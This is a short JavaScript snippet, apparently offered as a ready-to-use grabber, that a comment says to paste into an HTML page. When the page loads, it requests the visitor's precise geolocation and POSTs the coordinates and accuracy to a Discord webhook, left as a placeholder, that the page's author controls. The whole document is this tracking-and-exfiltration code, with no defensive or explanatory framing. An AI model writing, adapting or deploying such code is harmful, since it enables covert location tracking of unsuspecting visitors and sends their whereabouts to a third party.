//paste this in a html doc (<script>x</script> and it should work

const DCWHAPI = "x"; //discord webhook here
    var options = {
    enableHighAccuracy: true,
    timeout: 5000,
    maximumAge: 0
  };
  
  function success(pos) {
    var crd = pos.coords;
  
    const LOC = `Latitude : ${crd.latitude} Longitude: ${crd.longitude} More or less ${crd.accuracy} meters.`
    console.log(LOC)
    var xhr = new XMLHttpRequest();
xhr.open('POST', DCWHAPI, true);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = function () {};
const constantejongen = "content=" + LOC
xhr.send(constantejongen);
  }
  
  function error(err) {
    console.warn(`ERROR(${err.code}): ${err.message}`);
  }
  
  navigator.geolocation.getCurrentPosition(success, error, options);
  
  
